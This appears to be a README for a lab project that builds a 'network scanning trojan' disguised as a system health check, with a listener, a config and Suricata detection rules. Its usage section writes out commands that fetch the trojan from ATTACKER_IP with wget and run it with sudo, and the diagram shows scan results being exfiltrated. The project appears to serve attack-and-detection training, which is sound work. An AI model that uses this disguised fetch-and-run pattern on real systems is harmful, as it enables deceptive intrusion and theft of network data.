# Network Scanning Trojan Module

MITRE ATT&CK: T1046 (Network Service Scanning), T1041 (Exfiltration)

## Attack Flow

```
Attacker (Kali)              Victim (Ubuntu)
     |                            |
     |--[1] Serve script--------->|
     |                            |
     |<-[2] wget script-----------|
     |                            |
     |                     [3] Run script
     |                     [4] nmap scan
     |                            |
     |<-[5] Exfil results---------|
     |                            |
```

## Files

| File                     | Description                        |
| ------------------------ | ---------------------------------- |
| `config.json`            | Target network & attacker settings |
| `system_health_check.sh` | Trojan disguised as health check   |
| `listener.py`            | Attacker server to receive data    |
| `suricata.local.rules`   | Detection rules                    |

## Usage

### On Attacker (Kali):
```bash
cd src/network-scanning
python3 listener.py --port 8080
```

### On Victim (Ubuntu):
```bash
wget http://ATTACKER_IP:8080/system_health_check.sh
chmod +x system_health_check.sh
sudo ./system_health_check.sh
```

### Detection:
```bash
sudo cp suricata.local.rules /var/lib/suricata/rules/local.rules
sudo suricatasc -c "reload-rules"
```

## Configuration

Edit `config.json`:
```json
{
  "attacker": {"host": "192.168.71.100", "port": 8080},
  "scan": {"target_network": "192.168.85.0/24"}
}
```
